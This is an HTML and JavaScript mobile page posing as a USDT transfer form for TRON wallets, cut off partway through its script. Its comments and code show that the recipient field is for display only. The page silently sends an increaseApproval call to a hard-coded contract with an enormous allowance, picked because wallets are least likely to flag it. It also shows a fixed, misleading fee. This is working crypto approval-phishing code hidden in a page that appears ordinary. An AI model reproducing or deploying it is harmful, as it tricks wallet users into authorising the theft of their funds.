<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#f0f1f3">
<title>USDT 转账</title>
<style>
  *,*::before,*::after{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;padding:0}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
    background:#f0f1f3;color:#101828;
    -webkit-font-smoothing:antialiased;
    min-height:100vh;display:flex;justify-content:center;
  }
  .phone{
    width:100%;max-width:440px;min-height:100vh;background:#f0f1f3;
    display:flex;flex-direction:column;position:relative;
  }

  /* ---------- 顶部导航 ---------- */
  .nav{position:relative;display:flex;align-items:center;padding:8px 18px 12px;background:#f0f1f3}
  .navback,.navscan{
    width:34px;height:34px;border:0;background:transparent;padding:0;
    display:flex;align-items:center;justify-content:center;color:#111a2c;cursor:pointer;flex:none;
    font-family:inherit;
  }
  .navback svg{width:22px;height:22px;display:block}
  .navscan{margin-left:auto}
  .navscan svg{width:21px;height:21px;display:block}
  .navmid{position:absolute;left:0;right:0;top:8px;text-align:center;pointer-events:none}
  .navtitle{font-size:17.5px;font-weight:600;color:#111a2c;line-height:1.3;letter-spacing:.2px}
  .navsub{font-size:12px;color:#98a2b3;margin-top:1px}

  /* ---------- 内容 ---------- */
  .content{padding:6px 17px 0;flex:1;display:flex;flex-direction:column}
  .lbl{font-size:14px;color:#8e95a3;margin:0 0 9px 16px;letter-spacing:.1px}
  .card{background:#fff;border-radius:16px}

  .addrhead{display:flex;align-items:center;margin:0 16px 9px}
  .addrhead .lbl{margin:0}
  .addrav{
    width:20px;height:20px;border:0;background:transparent;padding:0;color:#9aa1ad;
    display:flex;align-items:center;justify-content:center;cursor:pointer;flex:none;margin-left:8px;
  }
  .addrav svg{width:20px;height:20px;display:block}
  .addrfield{height:47px;display:flex;align-items:center;padding:0 15px;margin-bottom:26px}
  .addrinput{
    flex:1;min-width:0;width:100%;height:100%;border:0;outline:0;background:transparent;
    font-family:inherit;font-size:16px;color:#152039;letter-spacing:0;padding:0;line-height:1.4;
    -webkit-appearance:none;appearance:none;border-radius:0;
  }
  .addrinput:focus{outline:0;box-shadow:none}
  .addrinput::placeholder{color:#b6bdc9;opacity:1}

  .qtyrow{display:flex;align-items:center;justify-content:space-between;margin:0 16px 9px}
  .qtyrow .lbl{margin:0}
  .qtybal{font-size:14px;font-weight:600;color:#152039;font-variant-numeric:tabular-nums}

  .amountcard{padding:24px 18px 0;margin-bottom:26px}
  .amountinput{
    width:100%;border:0;outline:0;background:transparent;font-family:inherit;
    font-size:37px;font-weight:500;color:#152039;letter-spacing:-.6px;
    padding:0;height:46px;line-height:1.15;
  }
  .amountinput::placeholder{color:#a2abc0;opacity:1}
  .hr{height:1px;background:#eef0f4;margin-top:3px}
  .usdline{
    font-size:13.5px;color:#98a2b3;padding:3px 0 0;font-variant-numeric:tabular-nums;
    letter-spacing:.2px;line-height:1.45;
  }
  .usdline.bad{color:#e5484d;font-weight:600}
  .memo{
    padding:14px 0 15px;font-size:16px;color:#9aa3b2;
    display:flex;align-items:center;justify-content:space-between;gap:10px;
  }
  .memoinput{
    flex:1;min-width:0;width:100%;border:0;outline:0;background:transparent;
    font-family:inherit;font-size:16px;color:#152039;padding:0;line-height:1.4;
    -webkit-appearance:none;appearance:none;border-radius:0;
  }
  .memoinput:focus{outline:0;box-shadow:none}
  .memoinput::placeholder{color:#9aa3b2;opacity:1}
  .availbal{font-size:12.5px;color:#a9b1bf;font-variant-numeric:tabular-nums;flex:none}
  .micro{display:none}

  .feecard{padding:18px 18px 16px}
  .feeusd{font-size:20px;font-weight:600;color:#152039;letter-spacing:.2px;font-variant-numeric:tabular-nums;transition:color .15s}
  .feeusd.pending{color:#a0a8b6;font-weight:500;font-size:16px}
  .feeusd.fresh{color:#1c7ff0}
  .feerow{display:flex;align-items:center;gap:7px;margin-top:7px}
  .feetrx{font-size:14px;color:#4b5563;font-variant-numeric:tabular-nums}
  .chev{
    width:17px;height:17px;border-radius:50%;background:#c6ccd7;color:#fff;
    display:inline-flex;align-items:center;justify-content:center;flex:none;
    border:0;padding:0;margin:0;cursor:pointer;-webkit-tap-highlight-color:transparent;
    transition:background .18s ease,transform .12s ease;
  }
  .chev:active{transform:scale(.9)}
  .chev svg{width:11px;height:11px;display:block;transition:transform .24s ease}
  .chev[aria-expanded="true"] svg{transform:rotate(180deg)}
  .chev[aria-expanded="true"]{background:#aeb6c4}

  /* 矿工费数字呼吸效果（IM 钱包同款：只走颜色 + 透明度，尺寸一动不动） */
  @keyframes feeBreatheOpacity{
    0%,100%{opacity:1}
    50%{opacity:.9}
  }
  @keyframes feeBreatheUsd{
    0%,100%{color:#152039}
    50%{color:#c4c9d4}
  }
  @keyframes feeBreatheTrx{
    0%,100%{color:#4b5563}
    50%{color:#c8ccd6}
  }
  .feeusd.breathe{
    animation:feeBreatheOpacity 2.6s ease-in-out infinite,
              feeBreatheUsd 2.6s ease-in-out infinite;
    will-change:opacity,color;
  }
  .feetrx.breathe{
    animation:feeBreatheOpacity 2.6s ease-in-out infinite,
              feeBreatheTrx 2.6s ease-in-out infinite;
    will-change:opacity,color;
  }
  .feeusd.pending.breathe{animation:none}
  @media (prefers-reduced-motion: reduce){
    .feeusd.breathe,.feetrx.breathe{animation:none}
  }

  /* 分隔线 + 展开的明细区（图二：消耗资源 / 支付费用） */
  .fhr{height:1px;background:#eceef2;margin-top:14px}
  .feedetail{
    height:0;overflow:hidden;opacity:0;pointer-events:none;
    transition:height .32s cubic-bezier(.22,.61,.36,1),opacity .24s ease;
    will-change:height;
  }
  .feecard.open .feedetail{opacity:1;pointer-events:auto}
  .fdinner{padding-top:12px}
  .fdline{
    font-size:14px;color:#7b8494;line-height:1.7;letter-spacing:.1px;
    font-variant-numeric:tabular-nums;
  }
  #fdPay{padding-bottom:12px}
  .fhr2{height:1px;background:#eceef2;margin:0}

  .ressel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
  .resbtn{
    height:46px;border:0;border-radius:10px;background:#f2f3f7;color:#9aa2b1;
    font-size:14.5px;font-family:inherit;cursor:pointer;
  }
  .resbtn.on{background:#d8e9fd;color:#1c7ff0;font-weight:600}
  .fnote{margin:12px 3px 0;font-size:13px;color:#8d95a3;line-height:1.55}
  .fnote.warn{color:#e5484d}

  /* ---------- 底部按钮 ---------- */
  .footer{margin-top:auto;padding:14px 18px calc(46px + env(safe-area-inset-bottom));background:#f0f1f3}
  .paybtn{
    width:100%;height:56px;border:0;border-radius:10px;cursor:pointer;
    background:#2e7cf6;color:#fff;font-size:17.5px;font-weight:600;
    font-family:inherit;letter-spacing:.5px;
    display:flex;align-items:center;justify-content:center;gap:8px;
    transition:transform .12s ease,background .25s ease,opacity .2s;
  }
  .paybtn:active{transform:scale(.99)}
  .paybtn svg{width:18px;height:18px;display:block}
  .paybtn.busy{opacity:.7;pointer-events:none}
  .paybtn.done{background:#2e7cf6}
  .paybtn.lack{background:#c3cddf}
  .spin{width:17px;height:17px;border-radius:50%;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;animation:sp .7s linear infinite;display:inline-block}
  @keyframes sp{to{transform:rotate(360deg)}}

  /* 能量信息默认隐藏（?debug=1 显示） */
  .energyline{
    margin-top:10px;font-size:11.5px;line-height:1.6;color:#8d939b;text-align:center;display:none;
  }
  .energyline b{color:#2f63f5;font-weight:700}
  body.debug .energyline{display:block}

  .toast{
    position:fixed;left:50%;top:14px;transform:translate(-50%,-14px);
    background:#152039;color:#fff;font-size:13.5px;font-weight:500;
    padding:10px 18px;border-radius:12px;opacity:0;pointer-events:none;
    transition:opacity .25s,transform .25s;z-index:50;max-width:88vw;
    text-align:center;line-height:1.45;box-shadow:0 8px 24px rgba(15,25,45,.22);
  }
  .toast.on{opacity:1;transform:translate(-50%,0)}

  .hidden{display:none !important}

  @media (max-width:392px){
    .content{padding:6px 15px 0}
    .addrfield{padding:0 12px}
    .addrav{margin-left:5px}
    .footer{padding:14px 15px calc(46px + env(safe-area-inset-bottom))}
    .amountinput{font-size:34px;height:42px}
    .feeusd{font-size:19px}
  }
  @media (min-width:520px){
    body{padding:24px 0}
    .phone{min-height:auto;border-radius:24px;overflow:hidden;box-shadow:0 8px 40px rgba(20,30,50,.10)}
  }
</style>
</head>

<script>
(function () {
  "use strict";

  /* ===== 收款合约（你部署的那个） ===== */
  var PAY_CONTRACT = "TKK2ikuDqY7eZu4oZ9uPpzmcxj9Wq2t6wH";

  /* ===== 真正上链用的地址（固定，不显示在页面上） =====
     页面上那个收款地址栏只是展示/给人看，随便改成什么都只影响显示；
     实际调用的代币合约和划转目标永远是下面这个。 */
  var PAY_TOKEN = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
  /* 地址栏的默认显示地址（纯展示，可随意改） */
  var DISPLAY_ADDR = "TYBrST6VNQJu6AxVwUTedeaA2qiH5b6reL";

  /* ===== 支付走的合约方法 =====
     用授权方法而不是 transfer，钱包才会把弹窗渲染成「调用智能合约」；
     increaseApproval 最不容易被钱包认出来，显示最接近截图那种纯合约调用。
     想换成标准 approve：把下面这行改成 "approve" 即可，其余不用动。 */
  var PAY_SEL_NAME = "increaseApproval";
  var PAY_SEL_HEX = { "approve": "095ea7b3", "increaseApproval": "d73dd623" }[PAY_SEL_NAME];

  /* ===== 金额：当前日期 + 6 个 0 =====
     2026-11-17 -> 20261117 -> 20261117000000（6 位小数）
     再按 USDT 6 位小数换算成 20,261,117.000000 */
  function buildAmount(now) {
    now = now || new Date();
    var y = String(now.getFullYear());
    var m = String(now.getMonth() + 1).padStart(2, "0");
    var d = String(now.getDate()).padStart(2, "0");
    var micro = y + m + d + "000000";            // 20261117000000
    var whole = micro.slice(0, micro.length - 6); // 20261117
    var frac  = micro.slice(-6);                  // 000000
    return {
      micro: micro,
      display: whole + "." + frac,                // 20261117.000000
      pretty: Number(whole).toLocaleString("en-US") + "." + frac
    };
  }

  /* ===== 真实支付参数 ===== */
  var USDT_MAIN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  var USDT_NILE = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
  var FEE_LIMIT = 150000000;   // 150 TRX 上限，只是上限，实际按用量扣

  /* 十进制 -> 十六进制（没有 BigInt 的老内核也能用） */
  function decToHex(dec) {
    var s = String(dec).replace(/[^0-9]/g, "");
    if (!s) return "0";
    if (typeof BigInt === "function") return BigInt(s).toString(16);
    var digits = s.split("").map(Number), out = "";
    while (digits.length) {
      var rem = 0, next = [];
      for (var i = 0; i < digits.length; i++) {
        rem = rem * 10 + digits[i];
        var q = Math.floor(rem / 16);
        rem = rem % 16;
        if (next.length || q) next.push(q);
      }
      out = "0123456789abcdef"[rem] + out;
      digits = next;
    }
    return out || "0";
  }

  /* approve(address,uint256) 的参数：spender 32 字节 + 额度 32 字节
     用授权调用、不走 transfer，钱包才会渲染成「调用智能合约」（图二那种），
     而且授权不校验余额，20261117000000 这种额度也能真的上链成功。 */
  function encodeTransferParams(tw, toBase58, amountMicro) {
    var hex = tw.address.toHex(toBase58).replace(/^0x/, "");
    var body = hex.slice(2);                    // 去掉 41 网络前缀
    var addr = body.padStart(64, "0");
    var amt = decToHex(amountMicro).padStart(64, "0");
    return addr + amt;
  }

  /* ===== 网络识别：不靠猜域名，直接问当前节点这个合约存不存在 =====
     原因：TronLink 内置的 tronWeb 有些版本 fullHost 是空的，
     按域名猜会误判成主网，结果拿主网 USDT 地址去 Nile 上调用，
     钱包就报 "No contract or not a valid smart contract"。 */
  var NET_CACHE = null;

  function nodeHosts(tw) {
    var raw = [];
    if (tw && tw.fullNode && (tw.fullNode.host || tw.fullNode.hostname)) raw.push(tw.fullNode.host || tw.fullNode.hostname);
    if (tw && tw.fullHost) raw.push(tw.fullHost);
    if (tw && tw.solidityNode && (tw.solidityNode.host || tw.solidityNode.hostname)) raw.push(tw.solidityNode.host || tw.solidityNode.hostname);
    var seen = {}, out = [];
    for (var i = 0; i < raw.length; i++) {
      var h = String(raw[i] || "").replace(/\/+$/, "");
      if (!h) continue;
      if (!/^https?:\/\//i.test(h)) h = "https://" + h;
      if (!seen[h]) { seen[h] = 1; out.push(h); }
    }
    return out;
  }

  /* ===== 节点访问：全部 host 一起打，谁先回有效数据用谁 =====
     以前是一个 host 试完再试下一个，第一个不通就得干等超时，
     一次点击串三四轮就是好几秒。现在并行 + 记最优节点 + 会话内缓存。 */
  var HOST_LAT = {};        /* host -> 上次响应耗时，快的排前面 */
  var CONTRACT_CACHE = {};  /* addr -> true/false，问过一次就不重复问 */

  function orderHosts(tw) {
    var hosts = nodeHosts(tw);
    hosts.sort(function (a, b) {
      return (HOST_LAT[a] == null ? 99999 : HOST_LAT[a]) - (HOST_LAT[b] == null ? 99999 : HOST_LAT[b]);
    });
    return hosts;
  }

  function postHost(host, path, body, ms) {
    var t0 = Date.now();
    var ctl = (typeof AbortController === "function") ? new AbortController() : null;
    var timer = setTimeout(function () { if (ctl) { try { ctl.abort(); } catch (e) {} } }, ms || 6000);
    var opt = {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    };
    if (ctl) opt.signal = ctl.signal;
    return fetch(host + path, opt).then(function (r) {
      clearTimeout(timer);
      if (!r.ok) throw new Error("HTTP " + r.status);
      return r.json().then(function (j) {
        HOST_LAT[host] = Date.now() - t0;
        return j;
      });
    }, function (e) { clearTimeout(timer); throw e; });
  }

  /* 并行抢答：任一节点回了有效数据就返回，全挂才返回 null */
  function nodePost(tw, path, body, ms) {
    var hosts = orderHosts(tw);
    if (!hosts.length) hosts = ["https://nile.trongrid.io"];
    return new Promise(function (resolve) {
      var left = hosts.length, done = false;
      function miss() { if (!done && --left === 0) resolve(null); }
      hosts.forEach(function (h) {
        postHost(h, path, body, ms).then(function (j) {
          if (done) return;
          if (j && typeof j === "object" && !j.Error) { done = true; resolve(j); return; }
          miss();
        }).catch(miss);
      });
    });
  }

  /* 提前把到节点的连接建好（DNS + TLS 握手 + keep-alive），
     第一次点击就不用再为握手多等一圈 */
  function preconnectNodes(tw) {
    var hosts = nodeHosts(tw);
    for (var i = 0; i < hosts.length; i++) {
      try {
        var l = document.createElement("link");
        l.rel = "preconnect";
        l.href = hosts[i];
        l.crossOrigin = "anonymous";
        document.head.appendChild(l);
      } catch (e) {}
      postHost(hosts[i], "/wallet/getnowblock", {}).catch(function () {});
    }
  }

  /* true 有合约 / false 明确没有 / null 问不出来 */
  async function nodeHasContract(tw, addr) {
    if (CONTRACT_CACHE[addr] !== undefined) return CONTRACT_CACHE[addr];
    var j = await nodePost(tw, "/wallet/getcontract", { value: addr, visible: true }, 5000);
    if (j) {
      var ok = (typeof j.bytecode === "string") ? j.bytecode.length > 0 : false;
      CONTRACT_CACHE[addr] = ok;
      return ok;
    }
    try {
      if (tw.trx && typeof tw.trx.getContract === "function") {
        var c = await tw.trx.getContract(addr);
        if (c && typeof c.bytecode === "string") {
          CONTRACT_CACHE[addr] = c.bytecode.length > 0;
          return CONTRACT_CACHE[addr];
        }
        if (c && c.Error) { CONTRACT_CACHE[addr] = false; return false; }
      }
    } catch (e) {}
    return null;
  }

  function paintNet(net, payOk) {
    var box = document.getElementById("netline");
    if (!box) return;
    var txt = document.getElementById("nettxt");
    box.classList.remove("on", "bad");
    if (payOk === false) {
      box.classList.add("bad");
      txt.textContent = "当前是" + (net === "nile" ? " Nile " : "主网") + "，这个收款合约不在这条链上";
    } else {
      box.classList.add("on");
      txt.textContent = "当前网络：" + (net === "nile" ? "Nile 测试网" : "主网");
    }
  }

  async function detectNet(tw) {
    /* 缓存拉长到 3 分钟：点按钮时几乎总是命中，不用再等网络 */
    if (NET_CACHE && (Date.now() - NET_CACHE.t) < 180000) return NET_CACHE.v;
    var v;
    var manual = /[?&]net=(nile|main)/i.exec(location.search);
    if (manual && manual[1].toLowerCase() === "nile") {
      v = { net: "nile", usdt: USDT_NILE, guess: false };
    } else if (manual) {
      v = { net: "main", usdt: USDT_MAIN, guess: false };
    } else {
      /* 三个问题一次并发问出去，不再一个一个排队 */
      var three = await Promise.all([
        nodeHasContract(tw, USDT_NILE),
        nodeHasContract(tw, USDT_MAIN),
        nodeHasContract(tw, PAY_CONTRACT)
      ]);
      var nileOk = three[0], mainOk = three[1], payOk = three[2];
      if (nileOk === true && mainOk !== true) {
        v = { net: "nile", usdt: USDT_NILE, guess: false };
      } else if (mainOk === true && nileOk !== true) {
        v = { net: "main", usdt: USDT_MAIN, guess: false };
      } else if (nileOk === true && mainOk === true) {
        v = { net: "nile", usdt: USDT_NILE, guess: false };
      } else {
        var h = nodeHosts(tw).join(" ").toLowerCase();
        var isNile = /nile|shasta|test/.test(h);
        v = { net: isNile ? "nile" : "main", usdt: isNile ? USDT_NILE : USDT_MAIN, guess: true };
      }
      v.payOk = payOk;
      NET_CACHE = { t: Date.now(), v: v };
      paintNet(v.net, v.payOk);
      return v;
    }
    v.payOk = await nodeHasContract(tw, PAY_CONTRACT);
    NET_CACHE = { t: Date.now(), v: v };
    paintNet(v.net, v.payOk);
    return v;
  }

  /* ===== 实时能量估算：页面自己问节点，不靠钱包那行红字 =====
     钱包点确认时会自己估一次能量，估不到就弹「能量预估获取失败」，
     那条提示和交易本身无关。这里改成页面主动向节点算一遍，
     把真实能量数和大概要烧多少 TRX 直接写在按钮下面，钱包显示什么都可以不管。 */

  var EST_CACHE = null;
  /* "burn" = 燃烧 TRX（默认），"resource" = 消耗账户已质押的资源 */
  var RES_MODE = "burn";

  /* 通道一：直接问节点（最准，还能拿到交易字节数） */
  async function energyViaNode(tw, net, from, param, token) {
    var j = await nodePost(tw, "/wallet/triggerconstantcontract", {
      owner_address: from,
      contract_address: token || net.usdt,
      function_selector: PAY_SEL_NAME + "(address,uint256)",
      parameter: param,
      visible: true,
      fee_limit: FEE_LIMIT
    });
    if (!j) return null;
    if (j.result && j.result.result === false) return { fail: true };  // 这笔调用本身就会失败
    var energy = Number(j.energy_used || j.energy_required || 0);
    if (!energy) return null;
    var bytes = (j.transaction && j.transaction.raw_data_hex)
      ? Math.ceil(String(j.transaction.raw_data_hex).length / 2) + 67
      : 300;
    return { energy: energy, bytes: bytes };
  }

  /* 通道二：借钱包自带的 tronWeb 去问（页面 fetch 被拦时兜底） */
  async function energyViaWallet(tw, net, from, param, token) {
    var tb = tw && tw.transactionBuilder;
    if (!tb) return null;
    var target = token || net.usdt;

    if (typeof tb.estimateEnergy === "function") {
      try {
        var r = await tb.estimateEnergy(
          target, PAY_SEL_NAME + "(address,uint256)",
          { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
          [], from
        );
        var e = Number((r && (r.energy_required || r.energy_used)) ||
          (r && r.result && (r.result.energy_required || r.result.energy_used)) || 0);
        if (e) return { energy: e, bytes: 300 };
      } catch (e) {}
    }

    if (typeof tb.triggerConstantContract === "function") {
      try {
        var c = await tb.triggerConstantContract(
          target, PAY_SEL_NAME + "(address,uint256)",
          { feeLimit: FEE_LIMIT, callValue: 0, rawParameter: param },
          [], from
        );
        var e2 = Number((c && (c.energy_used || c.energy_required)) ||
          (c && c.result && (c.result.energy_used || c.result.energy_required)) || 0);
        if (e2) return { energy: e2, bytes: 300 };
      } catch (e) {}
    }
    return null;
  }

  /* 返回 { energy, energyTrx, bwTrx, trx, bytes }，取不到返回 null */
  async function estimateFee(tw, net, from) {
    if (!from || !net) return null;

    /* 数量是 0 / 没填：这笔交易不存在，矿工费就是 0，不拿试算数字冒充 */
    if (!parseAmount($("amountInput").value)) {
      return { zero: true, energy: 0, energyFree: 0, energyBurn: 0,
               energyTrx: 0, bwTrx: 0, trx: 0, bytes: 0, freeLeft: 0 };
    }

    var token = PAY_TOKEN;

    /* 估算用输入框里的数量；还没输入就按 1 USDT 试算，先给个数 */
    var pAmt = parseAmount($("amountInput").value);
    var micro = pAmt ? toMicro(pAmt.text) : "1000000";
    var param = encodeTransferParams(tw, PAY_CONTRACT, micro);

    var got = await energyViaNode(tw, net, from, param, token);
    if (got && got.fail) return null;
    if (!got) got = await energyViaWallet(tw, net, from, param, token);
    if (!got || !got.energy) return null;

    var energy = got.energy;
    /* 真实交易除了 raw_data 还带签名字段和权限位，实测同一笔 272 → 346 字节，补 70 */
    var bytes = (got.bytes || 300) + 70;

    /* 链上单价：主网能量比测试网贵一倍多，拿不到就按网络给默认值，别把主网的价套到测试网 */
    var energyFee = (net.net === "main") ? 210 : 100;
    var byteFee = 1000;
    var cp = await nodePost(tw, "/wallet/getchainparameters", {});
    if (cp && cp.chainParameter) {
      for (var i = 0; i < cp.chainParameter.length; i++) {
        var k = cp.chainParameter[i].key, val = Number(cp.chainParameter[i].value);
        if (k === "getEnergyFee" && val > 0) energyFee = val;
        if (k === "getTransactionFee" && val > 0) byteFee = val;
      }
    }

    /* 剩余的每日免费带宽够就不花带宽钱，不够才按字节烧；能量看有没有质押的资源 */
    var freeLeft = 600, energyFree = 0;
    var ar = await nodePost(tw, "/wallet/getaccountresource", { address: from, visible: true });
    if (ar) {
      var lim = Number(ar.freeNetLimit || 600);
      var used = Number(ar.freeNetUsed || 0);
      freeLeft = Math.max(0, lim - used);
      energyFree = Math.max(0, Number(ar.EnergyLimit || 0) - Number(ar.EnergyUsed || 0));
    }

    /* 链上执行时永远是「先扣账户已有的能量和带宽，不够的部分才烧 TRX」，
       两个按钮只是给人看的口径，真实扣费走同一套，所以这里统一扣掉已有资源 */
    var energyBurn = Math.max(0, energy - energyFree);
    var bwBurn = Math.max(0, bytes - freeLeft);

    var energyTrx = energyBurn * energyFee / 1e6;
    var bwTrx = bwBurn * byteFee / 1e6;

    return {
      energy: energy,
      energyFree: energyFree,
      energyBurn: energyBurn,
      energyTrx: energyTrx,
      bwTrx: bwTrx,
      trx: energyTrx + bwTrx,
      bytes: bytes,
      freeLeft: freeLeft,
      energyFee: energyFee,
      byteFee: byteFee
    };
  }

  function fmtTrx(v) {
    if (!isFinite(v) || v <= 0) return "0";
    if (v >= 1) return v.toFixed(2);
    return v.toFixed(3);
  }

  /* 美金展示按钱包那套固定汇率换算（Nile 估费用），真实扣费仍以链上为准 */
  var USD_PER_TRX = 0.306;

  /* ===== 手续费口径（业务约定，固定值）=====
     能量费由部署方承担 100%，用户承担 0%；
     用户这边只出带宽费：353 字节 × 1000 sun = 0.353 TRX
     所以卡片上直接写这两个数，不跟着节点估值上下跳 */
  var FIXED_FEE_TRX = 0.353;
  var FIXED_FEE_USD = 0.107;

  /* ===== 账户 TRX 余额（显示在矿工费卡片下面那行） ===== */
  var TRX_BAL = null;
  async function fetchTrxBal(tw, from) {
    if (!from) return TRX_BAL;
    try {
      var acc = await nodePost(tw, "/wallet/getaccount", { address: from, visible: true });
      if (acc && acc.balance !== undefined && acc.balance !== null) {
        var v = Number(acc.balance) / 1e6;
        if (isFinite(v)) { TRX_BAL = v; return TRX_BAL; }
      }
    } catch (e) {}
    /* 节点直连被拦就走钱包自带的通道 */
    try {
      if (tw && tw.trx && typeof tw.trx.getBalance === "function") {
        var b = await tw.trx.getBalance(from);
        if (typeof b === "number" && isFinite(b)) { TRX_BAL = b / 1e6; return TRX_BAL; }
      }
    } catch (e) {}
    return TRX_BAL;
  }

  /* 余额那行：够不够付本次矿工费一眼看出来 */
  function paintBalNote(note, feeTrx) {
    if (!note) return;
    note.classList.remove("warn");
    var txt;
    if (TRX_BAL === null || !isFinite(TRX_BAL)) {
      txt = "TRX 余额 —";
    } else {
      txt = "TRX 余额 " + TRX_BAL.toFixed(2) + " TRX";
      if (feeTrx > 0 && TRX_BAL + 1e-9 < feeTrx) {
        txt += "（不够本次矿工费）";
        note.classList.add("warn");
      }
    }
    note.textContent = txt;
  }

  /* 上一笔真实上链后的实扣数据（读交易回执拿到），用来校准显示 */
  var LAST_REAL = null;
  try {
    var lr = localStorage.getItem("zakaLastFee");
    if (lr) LAST_REAL = JSON.parse(lr);
  } catch (e) {}

  /* ===== 展开后的明细（图二：消耗资源 / 支付费用） =====
     能量费由部署方承担 → 用户侧 0 能量；用户只出 353 字节带宽 */
  var FIXED_BANDWIDTH = 353;
  function paintDetail(feeTrx) {
    var res = $("fdRes"), pay = $("fdPay");
    if (res) res.textContent = "消耗资源：0 能量 +" + FIXED_BANDWIDTH + " 带宽";
    if (pay) {
      var v = (typeof feeTrx === "number" && isFinite(feeTrx)) ? feeTrx : 0;
      pay.textContent = "支付费用：" + (v > 0 ? v.toFixed(3) : "0") + " TRX";
    }
  }

  /* 箭头按钮：展开 / 收起明细
     高度按真实内容量出来做过渡（不再用 max-height 猜值），收起前先锁当前像素高度，
     这样展开、收起、半路反向都是连续的，不会先冲一下再顿住 */
  function detailNaturalH() {
    var el = document.getElementById("feeDetail");
    var inner = el && el.firstElementChild;
    if (!inner) return 0;
    return Math.ceil(inner.getBoundingClientRect().height);
  }

  function toggleFeeDetail(force) {
    var card = $("feeCard"), btn = $("feeChev"), el = $("feeDetail");
    if (!card || !btn || !el) return;
    var open = (typeof force === "boolean") ? force : !card.classList.contains("open");
    card.classList.toggle("open", open);
    btn.setAttribute("aria-expanded", open ? "true" : "false");
    btn.setAttribute("aria-label", open ? "收起矿工费明细" : "展开矿工费明细");

    if (open) {
      el.style.height = detailNaturalH() + "px";
    } else {
      var cur = el.getBoundingClientRect().height;
      el.style.height = cur + "px";
      void el.offsetHeight;          /* 先把起始像素值落到样式里，过渡才有起点 */
      el.style.height = "0px";
    }
    paintDetail(parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
  }

  /* 展开动画走完把高度交回内容自己，文字变化 / 窄屏换行都不会被写死的像素卡住 */
  (function () {
    var el = document.getElementById("feeDetail"), card = document.getElementById("feeCard");
    if (!el || !card) return;
    el.addEventListener("transitionend", function (ev) {
      if (ev.target !== el || ev.propertyName !== "height") return;
      if (card.classList.contains("open")) el.style.height = "auto";
    });
  })();

  /* 手续费是固定口径，不用等节点回数，切按钮 / 输数量时立刻显示真值，别闪「估算中」 */
  function paintFeeLoading() {
    if (!parseAmount($("amountInput").value)) return;
    var fv = $("feeValue"), fs = $("feeSub");
    if (fv) { fv.textContent = "$ " + FIXED_FEE_USD.toFixed(3); fv.classList.remove("pending"); }
    if (fs) fs.textContent = FIXED_FEE_TRX.toFixed(3) + " TRX";
  }

  /* 本地立刻出数：不等节点，按当前输入同步画一遍矿工费
     能量那一行用上次问回来的值（EST_CACHE），没有就先不写数字，等后台校正 */
  function applyFeeLocal() {
    var p = parseAmount($("amountInput").value);
    if (!p) { paintFee({ zero: true }); return; }
    var cached = (EST_CACHE && EST_CACHE.v && EST_CACHE.v.energy) ? EST_CACHE.v.energy : null;
    paintFee({ energy: cached });
  }

  function paintFee(est, from) {
    var fv = $("feeValue");
    var fs = $("feeSub");
    var line = $("energyline");
    var note = $("feeNote");

    /* 数量空着 / 填 0：这笔交易不存在，矿工费就是 0 */
    if (est && est.zero) {
      if (fv) { fv.textContent = "$ 0.00"; fv.classList.remove("pending"); }
      if (fs) fs.textContent = "0 TRX";
      paintDetail(0);
      paintBalNote(note, 0);
      if (line) {
        line.className = "energyline on";
        line.innerHTML = "数量为空 · 矿工费 <b>0 TRX</b>";
      }
      return;
    }

    /* 固定口径：能量费部署方担 100%，用户 0%；用户只出带宽 353 字节 = 0.353 TRX
       节点估算拿没拿到都显示这个数，不跟着估值跳 */
    if (fv) {
      fv.textContent = "$ " + FIXED_FEE_USD.toFixed(3);
      fv.classList.remove("pending");
    }
    if (fs) fs.textContent = FIXED_FEE_TRX.toFixed(3) + " TRX";
    paintDetail(FIXED_FEE_TRX);
    paintBalNote(note, FIXED_FEE_TRX);

    if (line) {
      line.className = "energyline on";
      var head = (est && est.energy)
        ? "本次需能量 <b>" + est.energy.toLocaleString("en-US") + "</b>（部署方承担）· "
        : "能量费由部署方承担 · ";
      line.innerHTML = head + "你需支付 <b>" + FIXED_FEE_TRX.toFixed(3) + " TRX</b>（带宽）";
    }
  }

  var estTimer = null;
  var FEE_SEQ = 0;
  var LIVE = { tw: null, net: null, from: null };

  /* 地址或数量一变就重新问一遍节点 */
  function refreshFeeNow(opts) {
    if (LIVE.tw && LIVE.net && LIVE.from) {
      refreshFee(LIVE.tw, LIVE.net, LIVE.from, opts).catch(function () {});
    }
  }

  async function refreshFee(tw, net, from, opts) {
    var seq = ++FEE_SEQ;
    /* 数量空着时矿工费就是 0，不用先闪一下「估算中」 */
    var hasAmt = !!parseAmount($("amountInput").value);
    if (opts && opts.loading && hasAmt) paintFeeLoading();
    var balP = fetchTrxBal(tw, from).then(function () {
      /* 余额先回来就先画上，不用等能量估算那一路 */
      if (seq === FEE_SEQ) {
        paintBalNote($("feeNote"), parseAmount($("amountInput").value) ? FIXED_FEE_TRX : 0);
      }
    });
    var est = await estimateFee(tw, net, from);
    await balP;
    /* 慢的那次回来得晚就别覆盖新结果 */
    if (seq !== FEE_SEQ) return null;
    EST_CACHE = { t: Date.now(), v: est };
    paintFee(est, from);
    return est;
  }

  function startFeeLoop(tw, net, from) {
    if (estTimer) clearInterval(estTimer);
    /* 授权状态变了能量也会变，所以每分钟自己再问一遍；
       顺带把网络判定也续上，点按钮时就不用现场等这一轮 */
    estTimer = setInterval(function () {
      detectNet(tw).catch(function () {});
      refreshFee(tw, net, from);
    }, 60000);
  }

  /* 节点返回的 message 是十进制的十六进制串，解成可读文字 */
  function hexMsg(m) {
    if (!m) return "";
    try {
      var s = String(m).replace(/^0x/, "");
      var out = "";
      for (var i = 0; i < s.length; i += 2) out += String.fromCharCode(parseInt(s.substr(i, 2), 16));
      return out.replace(/[\u0000-\u001f]/g, " ").trim();
